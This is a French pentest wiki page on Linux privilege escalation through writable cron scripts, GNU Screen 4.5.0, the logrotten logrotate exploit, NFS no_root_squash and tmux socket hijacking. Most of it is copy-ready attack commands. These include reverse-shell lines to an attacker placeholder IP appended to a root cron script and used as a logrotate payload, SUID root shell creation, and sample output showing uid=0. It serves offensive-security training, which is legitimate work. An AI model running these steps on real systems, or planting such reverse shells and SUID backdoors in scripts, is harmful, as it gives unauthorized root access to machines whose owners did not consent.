# Services, cron jobs et techniques diverses

Les services mal configures, les taches planifiees modifiables et certains mecanismes systeme constituent une famille de vecteurs d'escalade tres courante. Cette page couvre l'abus de cron jobs, les services vulnerables (Screen, logrotate), les partages NFS non securises et le detournement de sessions tmux.

## Pourquoi

Les cron jobs executent des scripts a intervalles reguliers, souvent en tant que root. Si un attaquant peut modifier le script execute ou influencer son comportement, il obtient une execution de code en root. Les services avec des bits SUID ou des versions vulnerables offrent des opportunites similaires. Ces vecteurs sont frequents car ils resultent de pratiques d'administration courantes plutot que de vulnerabilites logicielles complexes.

## Comment ca marche

### Cron jobs

Les taches cron s'executent selon un planning defini dans `/etc/crontab`, les repertoires `/etc/cron.d/`, `/etc/cron.daily/`, ou les crontabs individuels des utilisateurs. L'abus se produit quand :

| Condition | Exploitation |
|---|---|
| Script execute par root mais modifiable par l'utilisateur | Ajout d'un reverse shell au script |
| Cron job qui utilise des wildcards | Injection d'arguments via des noms de fichiers |
| Script dans un repertoire world-writable | Remplacement du script |

### Screen 4.5.0

La version 4.5.0 de GNU Screen souffre d'une vulnerabilite qui permet d'ecrire dans `/etc/ld.so.preload` via le mecanisme de logs. Cette ecriture force le chargement d'une bibliotheque partagee malveillante, qui cree ensuite un binaire SUID root.

### Logrotate

L'utilitaire `logrotate` gere la rotation des fichiers de logs. Si un utilisateur a les droits d'ecriture sur les fichiers de logs et que logrotate s'execute en root avec une version vulnerable, l'exploit `logrotten` permet d'obtenir une execution de code privilegiee.

### NFS avec no_root_squash

L'option `no_root_squash` sur un partage NFS permet a un utilisateur root distant de creer des fichiers en tant que root sur le serveur. Cela inclut la possibilite de creer des binaires SUID.

### Sessions tmux

Si un utilisateur privilegie a laisse une session tmux attachee a un socket accessible, un attaquant membre du bon groupe peut s'y attacher et heriter des privileges.

## En pratique

### Abus de cron jobs

```bash
# - Identifier les fichiers modifiables (scripts de cron)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# - Verifier le contenu des crontabs
cat /etc/crontab
ls -la /etc/cron.d/

# - Confirmer l'execution avec pspy
./pspy64 -pf -i 1000
# Observer les lignes UID=0 pour reperer les scripts root
```

{% tabs %}
{% tab title="Script modifiable" %}
```bash
# - Examiner un script de backup world-writable
cat /dmz-backups/backup.sh
# #!/bin/bash
# SRCDIR="/var/www/html"
# DESTDIR="/dmz-backups/"
# FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
# tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

# - Faire une sauvegarde puis ajouter un reverse shell
cp /dmz-backups/backup.sh /tmp/backup.sh.bak
echo 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/443 0>&1' >> /dmz-backups/backup.sh

# - Mettre un listener en ecoute
nc -lnvp 443
# Attendre l'execution du cron job
```
{% endtab %}
{% tab title="Repertoire writable" %}
```bash
# - Si le script est dans un repertoire world-writable
# Remplacer le script entierement
cat << 'EOF' > /chemin/vers/script.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

# - Apres execution du cron
/tmp/rootbash -p
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Toujours faire une sauvegarde du script original avant modification. En pentest, restaurer le script apres avoir obtenu l'acces pour ne pas perturber les operations.
{% endhint %}

### Exploitation de Screen 4.5.0

```bash
# - Verifier la version de screen
screen -v
# Screen version 4.05.00 (GNU) 10-Dec-16

# - Utiliser l'exploit screenroot.sh
# L'exploit cree une bibliotheque partagee malveillante,
# ecrit dans /etc/ld.so.preload via screen,
# puis execute un shell SUID root

chmod +x screenroot.sh
./screenroot.sh

# Resultat :
# ~ gnu/screenroot ~
# [+] First, we create our shell and library...
# [+] done!
# # id
# uid=0(root) gid=0(root) groups=0(root)
```

### Exploitation de logrotate

```bash
# - Prerequis : droits d'ecriture sur un fichier de log
# et logrotate execute en root

# - Compiler logrotten
git clone https://github.com/whotwagner/logrotten.git
cd logrotten && gcc logrotten.c -o logrotten

# - Preparer le payload
echo 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/9001 0>&1' > payload

# - Verifier le mode de logrotate
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# - Lancer l'exploit
./logrotten -p ./payload /tmp/tmp.log

# - En parallele, ecouter sur le port
nc -lnvp 9001
```

### Abus de NFS no_root_squash

```bash
# - Depuis la machine d'attaque, identifier les exports NFS
showmount -e <IP_CIBLE>
# /tmp             *
# /var/nfs/general *

# - Verifier la configuration
cat /etc/exports
# /tmp *(rw,no_root_squash)

# - Compiler un binaire SUID sur la machine d'attaque
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc /tmp/shell.c -o /tmp/shell

# - Monter le partage et deposer le binaire SUID
sudo mount -t nfs <IP_CIBLE>:/tmp /mnt
sudo cp /tmp/shell /mnt/
sudo chmod u+s /mnt/shell

# - Sur la cible, executer le binaire
/tmp/shell
# uid=0(root)
```

### Detournement de sessions tmux

```bash
# - Chercher des sessions tmux d'autres utilisateurs
ps aux | grep tmux

# - Verifier les permissions du socket
ls -la /shareds
# srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds

# - Si on est dans le groupe "devs"
id
# groups=...,1011(devs)

# - S'attacher a la session
tmux -S /shareds
# On herite des privileges de la session (root)
```

## Pieges et galeres

- **Frequence des cron jobs** : un cron job qui s'execute toutes les heures demande de la patience. Utiliser `pspy` pour confirmer la frequence avant de modifier le script
- **Screen SUID retire** : sur les distributions modernes, le bit SUID a ete retire de screen. L'exploit ne fonctionne que si screen est SUID et en version 4.5.0
- **Logrotate et timing** : l'exploit logrotten depend d'une race condition. Il peut necessite plusieurs tentatives
- **NFS et firewalls** : les ports NFS (2049, RPC) peuvent etre filtres. Verifier l'accessibilite avant de tenter le montage
- **tmux et TTY** : s'attacher a une session tmux necessite un terminal interactif. Un simple reverse shell sans upgrade ne fonctionnera pas

## Memo express

| Commande | Usage |
|---|---|
| `cat /etc/crontab` | Voir les cron jobs systeme |
| `./pspy64 -pf -i 1000` | Surveiller les processus |
| `find / -perm -o+w -type f` | Fichiers world-writable |
| `screen -v` | Version de screen |
| `showmount -e <IP>` | Exports NFS |
| `cat /etc/exports` | Configuration NFS |
| `tmux -S /socket` | Attacher a une session tmux |
| `./logrotten -p payload fichier.log` | Exploit logrotate |

***
